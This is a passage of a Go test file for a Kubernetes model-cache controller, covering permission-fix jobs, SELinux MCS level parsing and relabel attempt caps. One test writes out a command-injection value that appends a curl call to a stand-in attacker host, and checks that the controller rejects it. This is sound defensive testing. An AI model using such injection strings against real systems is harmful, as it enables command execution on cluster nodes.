				}`, modelCacheNamespace),
				"storageInitializer": configs["storageInitializer"],
				"openshiftConfig": `{
					"modelcachePermissionFixImage": "quay.io/opendatahub/kserve-agent:latest"
				}`,
			}

			configMap := &corev1.ConfigMap{
				ObjectMeta: metav1.ObjectMeta{
					Name:      constants.InferenceServiceConfigMapName,
					Namespace: constants.KServeNamespace,
				},
				Data: configsNoFSGroup,
			}
			Expect(k8sClient.Create(ctx, configMap)).NotTo(HaveOccurred())
			defer k8sClient.Delete(ctx, configMap)

			nodeName = "worker-no-fsgroup"
			node := &corev1.Node{
				ObjectMeta: metav1.ObjectMeta{
					Name:   nodeName,
					Labels: map[string]string{"node.kubernetes.io/instance-type": "gpu"},
				},
				Status: corev1.NodeStatus{
					Conditions: []corev1.NodeCondition{
						{Type: corev1.NodeReady, Status: corev1.ConditionTrue},
					},
				},
			}
			Expect(k8sClient.Create(ctx, node)).Should(Succeed())
			defer k8sClient.Delete(ctx, node)

			localModelNode := &v1alpha1.LocalModelNode{
				ObjectMeta: metav1.ObjectMeta{Name: nodeName},
				Spec: v1alpha1.LocalModelNodeSpec{
					LocalModels: []v1alpha1.LocalModelInfo{},
				},
			}
			Expect(k8sClient.Create(ctx, localModelNode)).Should(Succeed())
			defer k8sClient.Delete(ctx, localModelNode)

			jobs := &batchv1.JobList{}
			fixLabels := map[string]string{
				"fix-permissions": "true",
				"node":            nodeName,
			}
			Eventually(func() bool {
				err := k8sClient.List(ctx, jobs, client.InNamespace(modelCacheNamespace), client.MatchingLabels(fixLabels))
				return err == nil && len(jobs.Items) == 1
			}, timeout, interval).Should(BeTrue(), "Permission fix job should be created")

			job := &jobs.Items[0]
			container := job.Spec.Template.Spec.Containers[0]
			envMap := map[string]string{}
			for _, e := range container.Env {
				envMap[e.Name] = e.Value
			}
			Expect(envMap).To(HaveKeyWithValue("FIX_UID", strconv.Itoa(os.Getuid())),
				"FIX_UID should fall back to process UID when FSGroup is nil")
			Expect(envMap).To(HaveKeyWithValue("FIX_GID", strconv.Itoa(os.Getgid())),
				"FIX_GID should fall back to process GID when FSGroup is nil")

			isModelRootWritable = func() bool { return true }
		})

		It("Should reject invalid MCS level from namespace annotation via the download job", func() {
			ctx, cancel := context.WithCancel(context.Background())
			DeferCleanup(cancel)
			fsMock.clear()
			isModelRootWritable = func() bool { return true }
			fsHelper = fsMock
			storageKey := v1alpha1.GetStorageKey(sourceModelUri)
			fsMock.mockModel(&MockFileInfo{name: storageKey, isDir: true})

			// Patch jobNamespace with an invalid MCS level (injection attempt). enhanceDownloadJob
			// resolves the download pod's MCS from this annotation (SCC MustRunAs admission) and
			// must reject a malformed value rather than let it reach a shell argument. With the
			// shared-label fix, resolveMCSLevel no longer runs on the permission-fix path, so this
			// rejection guard now lives only on the download path.
			existingNs := &corev1.Namespace{}
			Expect(k8sClient.Get(ctx, types.NamespacedName{Name: modelCacheNamespace}, existingNs)).Should(Succeed())
			patch := client.MergeFrom(existingNs.DeepCopy())
			if existingNs.Annotations == nil {
				existingNs.Annotations = map[string]string{}
			}
			existingNs.Annotations["openshift.io/sa.scc.mcs"] = "s0:c1,c2 ; curl http://evil.example.com #"
			Expect(k8sClient.Patch(ctx, existingNs, patch)).Should(Succeed())
			defer func() {
				ns := &corev1.Namespace{}
				_ = k8sClient.Get(ctx, types.NamespacedName{Name: modelCacheNamespace}, ns)
				p := client.MergeFrom(ns.DeepCopy())
				delete(ns.Annotations, "openshift.io/sa.scc.mcs")
				_ = k8sClient.Patch(ctx, ns, p)
			}()

			configMap := &corev1.ConfigMap{
				ObjectMeta: metav1.ObjectMeta{
					Name:      constants.InferenceServiceConfigMapName,
					Namespace: constants.KServeNamespace,
				},
				Data: configs,
			}
			Expect(k8sClient.Create(ctx, configMap)).NotTo(HaveOccurred())
			defer k8sClient.Delete(ctx, configMap)

			clusterStorageContainer := &v1alpha1.ClusterStorageContainer{
				ObjectMeta: metav1.ObjectMeta{Name: "test-ocp-invalid-mcs"},
				Spec:       clusterStorageContainerSpec,
			}
			Expect(k8sClient.Create(ctx, clusterStorageContainer)).Should(Succeed())
			defer k8sClient.Delete(ctx, clusterStorageContainer)

			nodeGroup := &v1alpha1.LocalModelNodeGroup{
				ObjectMeta: metav1.ObjectMeta{Name: "gpu"},
				Spec:       localModelNodeGroupSpec,
			}
			Expect(k8sClient.Create(ctx, nodeGroup)).Should(Succeed())
			defer k8sClient.Delete(ctx, nodeGroup)

			nodeName = "worker-invalid-mcs"
			node := &corev1.Node{
				ObjectMeta: metav1.ObjectMeta{
					Name:   nodeName,
					Labels: map[string]string{"node.kubernetes.io/instance-type": "gpu"},
				},
				Status: corev1.NodeStatus{
					Conditions: []corev1.NodeCondition{
						{Type: corev1.NodeReady, Status: corev1.ConditionTrue},
					},
				},
			}
			Expect(k8sClient.Create(ctx, node)).Should(Succeed())
			defer k8sClient.Delete(ctx, node)

			localModelNode := &v1alpha1.LocalModelNode{
				ObjectMeta: metav1.ObjectMeta{Name: nodeName},
				Spec: v1alpha1.LocalModelNodeSpec{
					LocalModels: []v1alpha1.LocalModelInfo{
						{SourceModelUri: sourceModelUri, ModelName: modelName},
					},
				},
			}
			Expect(k8sClient.Create(ctx, localModelNode)).Should(Succeed())
			defer k8sClient.Delete(ctx, localModelNode)

			// enhanceDownloadJob rejects the invalid MCS before the job is created (controller.go
			// calls it prior to Jobs.Create), so no download job is ever persisted.
			downloadJobs := &batchv1.JobList{}
			labelSelector := map[string]string{
				"model": modelName,
				"node":  nodeName,
			}
			Consistently(func() int {
				_ = k8sClient.List(ctx, downloadJobs, client.InNamespace(modelCacheNamespace), client.MatchingLabels(labelSelector))
				return len(downloadJobs.Items)
			}, time.Second*3, interval).Should(Equal(0),
				"No download job should be created when the namespace MCS annotation is invalid")

			isModelRootWritable = func() bool { return true }
		})

		It("Should launch permission fix job when a subdirectory carries non-shared MCS categories", func() {
			ctx, cancel := context.WithCancel(context.Background())
			DeferCleanup(cancel)

			fsMock = &mockFileSystem{
				subDirs: []os.DirEntry{},
			}
			fsHelper = fsMock
			isModelRootWritable = func() bool { return true }

			// Real temp dir with a readable subdirectory (mode 0750) so the permission scan passes
			// the os.ReadDir check and reaches the MCS-label gate.
			tmpDir, err := os.MkdirTemp("", "modelcache-mcs-*")
			Expect(err).NotTo(HaveOccurred())
			defer os.RemoveAll(tmpDir)
			Expect(os.Mkdir(filepath.Join(tmpDir, "model-categorized"), 0o750)).To(Succeed())
			savedModelsRoot := modelsRootFolder
			modelsRootFolder = tmpDir
			defer func() { modelsRootFolder = savedModelsRoot }()

			// Inject a categorized-label result without needing a real SELinux filesystem.
			savedMCS := folderHasNonSharedMCS
			folderHasNonSharedMCS = func(string) (bool, error) { return true, nil }
			defer func() { folderHasNonSharedMCS = savedMCS }()

			configMap := &corev1.ConfigMap{
				ObjectMeta: metav1.ObjectMeta{
					Name:      constants.InferenceServiceConfigMapName,
					Namespace: constants.KServeNamespace,
				},
				Data: configs,
			}
			Expect(k8sClient.Create(ctx, configMap)).NotTo(HaveOccurred())
			defer k8sClient.Delete(ctx, configMap)

			nodeName = "worker-mcs-categorized"
			node := &corev1.Node{
				ObjectMeta: metav1.ObjectMeta{
					Name:   nodeName,
					Labels: map[string]string{"node.kubernetes.io/instance-type": "gpu"},
				},
				Status: corev1.NodeStatus{
					Conditions: []corev1.NodeCondition{
						{Type: corev1.NodeReady, Status: corev1.ConditionTrue},
					},
				},
			}
			Expect(k8sClient.Create(ctx, node)).Should(Succeed())
			defer k8sClient.Delete(ctx, node)

			localModelNode := &v1alpha1.LocalModelNode{
				ObjectMeta: metav1.ObjectMeta{Name: nodeName},
				Spec: v1alpha1.LocalModelNodeSpec{
					LocalModels: []v1alpha1.LocalModelInfo{},
				},
			}
			Expect(k8sClient.Create(ctx, localModelNode)).Should(Succeed())
			defer k8sClient.Delete(ctx, localModelNode)

			jobs := &batchv1.JobList{}
			fixLabels := map[string]string{
				"fix-permissions": "true",
				"node":            nodeName,
			}
			Eventually(func() bool {
				err := k8sClient.List(ctx, jobs, client.InNamespace(modelCacheNamespace), client.MatchingLabels(fixLabels))
				return err == nil && len(jobs.Items) == 1
			}, timeout, interval).Should(BeTrue(),
				"Permission fix job should be created when a subdirectory carries MCS categories")

			isModelRootWritable = func() bool { return true }
		})

		It("Should not launch permission fix job when subdirectories are at the shared MCS level", func() {
			ctx, cancel := context.WithCancel(context.Background())
			DeferCleanup(cancel)

			fsMock.clear()
			fsHelper = fsMock
			isModelRootWritable = func() bool { return true }
			storageKey := v1alpha1.GetStorageKey(sourceModelUri)
			fsMock.mockModel(&MockFileInfo{name: storageKey, isDir: true})

			tmpDir, err := os.MkdirTemp("", "modelcache-mcs-shared-*")
			Expect(err).NotTo(HaveOccurred())
			defer os.RemoveAll(tmpDir)
			Expect(os.Mkdir(filepath.Join(tmpDir, "model-shared"), 0o750)).To(Succeed())
			savedModelsRoot := modelsRootFolder
			modelsRootFolder = tmpDir
			defer func() { modelsRootFolder = savedModelsRoot }()

			// Folder already at the shared level → no relabel needed.
			savedMCS := folderHasNonSharedMCS
			folderHasNonSharedMCS = func(string) (bool, error) { return false, nil }
			defer func() { folderHasNonSharedMCS = savedMCS }()

			configMap := &corev1.ConfigMap{
				ObjectMeta: metav1.ObjectMeta{
					Name:      constants.InferenceServiceConfigMapName,
					Namespace: constants.KServeNamespace,
				},
				Data: configs,
			}
			Expect(k8sClient.Create(ctx, configMap)).NotTo(HaveOccurred())
			defer k8sClient.Delete(ctx, configMap)

			clusterStorageContainer := &v1alpha1.ClusterStorageContainer{
				ObjectMeta: metav1.ObjectMeta{Name: "test-ocp-mcs-shared"},
				Spec:       clusterStorageContainerSpec,
			}
			Expect(k8sClient.Create(ctx, clusterStorageContainer)).Should(Succeed())
			defer k8sClient.Delete(ctx, clusterStorageContainer)

			nodeGroup := &v1alpha1.LocalModelNodeGroup{
				ObjectMeta: metav1.ObjectMeta{Name: "gpu"},
				Spec:       localModelNodeGroupSpec,
			}
			Expect(k8sClient.Create(ctx, nodeGroup)).Should(Succeed())
			defer k8sClient.Delete(ctx, nodeGroup)

			nodeName = "worker-mcs-shared"
			node := &corev1.Node{
				ObjectMeta: metav1.ObjectMeta{
					Name:   nodeName,
					Labels: map[string]string{"node.kubernetes.io/instance-type": "gpu"},
				},
				Status: corev1.NodeStatus{
					Conditions: []corev1.NodeCondition{
						{Type: corev1.NodeReady, Status: corev1.ConditionTrue},
					},
				},
			}
			Expect(k8sClient.Create(ctx, node)).Should(Succeed())
			defer k8sClient.Delete(ctx, node)

			localModelNode := &v1alpha1.LocalModelNode{
				ObjectMeta: metav1.ObjectMeta{Name: nodeName},
				Spec: v1alpha1.LocalModelNodeSpec{
					LocalModels: []v1alpha1.LocalModelInfo{
						{SourceModelUri: sourceModelUri, ModelName: modelName},
					},
				},
			}
			Expect(k8sClient.Create(ctx, localModelNode)).Should(Succeed())
			defer k8sClient.Delete(ctx, localModelNode)

			// Reconcile ran (download job appears), but no permission-fix job is created.
			downloadJobs := &batchv1.JobList{}
			Eventually(func() bool {
				err := k8sClient.List(ctx, downloadJobs, client.InNamespace(modelCacheNamespace),
					client.MatchingLabels(map[string]string{"model": modelName, "node": nodeName}))
				return err == nil && len(downloadJobs.Items) == 1
			}, timeout, interval).Should(BeTrue(), "Download job should be created")

			fixJobs := &batchv1.JobList{}
			fixErr := k8sClient.List(ctx, fixJobs, client.InNamespace(modelCacheNamespace),
				client.MatchingLabels(map[string]string{"fix-permissions": "true", "node": nodeName}))
			Expect(fixErr).ShouldNot(HaveOccurred())
			Expect(fixJobs.Items).To(BeEmpty(),
				"No permission fix job when subdirectories are already at the shared MCS level")
		})
	})

	Context("parseMCSLevel", func() {
		DescribeTable("extracts the MCS level from a full SELinux context",
			func(selinuxContext, expected string) {
				Expect(parseMCSLevel(selinuxContext)).To(Equal(expected))
			},
			// SplitN(":", 4) keeps the level (which itself contains a colon) intact.
			Entry("context with categories", "system_u:object_r:container_file_t:s0:c2,c28", "s0:c2,c28"),
			Entry("trailing null and newline trimmed", "system_u:object_r:container_file_t:s0:c2,c28\x00\n", "s0:c2,c28"),
			Entry("category-less context", "system_u:object_r:container_file_t:s0", "s0"),
			Entry("sensitivity range, no categories", "system_u:object_r:container_file_t:s0-s0", "s0-s0"),
			Entry("too few segments", "s0:c2,c28", ""),
			Entry("empty string", "", ""),
		)

		// folderHasNonSharedMCS treats a level as "categorized" when it still contains a colon.
		DescribeTable("categorized predicate (parsed level contains a colon)",
			func(selinuxContext string, hasCategories bool) {
				Expect(strings.Contains(parseMCSLevel(selinuxContext), ":")).To(Equal(hasCategories))
			},
			Entry("categorized level", "system_u:object_r:container_file_t:s0:c2,c28", true),
			Entry("shared level", "system_u:object_r:container_file_t:s0", false),
			Entry("range without categories", "system_u:object_r:container_file_t:s0-s0", false),
			Entry("unparseable context", "", false),
		)
	})

	Context("relabel attempt cap", func() {
		It("counts per path, enforces the cap, and resets when the folder is clean", func() {
			path := "/var/lib/kserve/models/attempt-cap-test"
			resetRelabelAttempts(path)
			defer resetRelabelAttempts(path)

			Expect(relabelAttemptCount(path)).To(Equal(0))

			// Simulate a folder that never reaches the shared level: each reconcile records an
			// attempt until the cap is reached.
			for i := 1; i <= maxRelabelAttempts; i++ {
				recordRelabelAttempt(path)
				Expect(relabelAttemptCount(path)).To(Equal(i))
			}
			Expect(relabelAttemptCount(path)).To(BeNumerically(">=", maxRelabelAttempts),
				"once at the cap the reconciler stops launching the privileged relabel job")

			// A folder that reaches the shared level clears its counter, so a later legitimate
			// re-download can be relabeled again.
			resetRelabelAttempts(path)
			Expect(relabelAttemptCount(path)).To(Equal(0))
		})

		It("tracks attempts independently per path", func() {
			a := "/var/lib/kserve/models/cap-a"
			b := "/var/lib/kserve/models/cap-b"
			resetRelabelAttempts(a)
			resetRelabelAttempts(b)
			defer resetRelabelAttempts(a)
			defer resetRelabelAttempts(b)

			recordRelabelAttempt(a)
			recordRelabelAttempt(a)
			recordRelabelAttempt(b)

			Expect(relabelAttemptCount(a)).To(Equal(2))
			Expect(relabelAttemptCount(b)).To(Equal(1))

			resetRelabelAttempts(a)
			Expect(relabelAttemptCount(a)).To(Equal(0))
			Expect(relabelAttemptCount(b)).To(Equal(1), "resetting one path must not affect another")
		})
	})
})
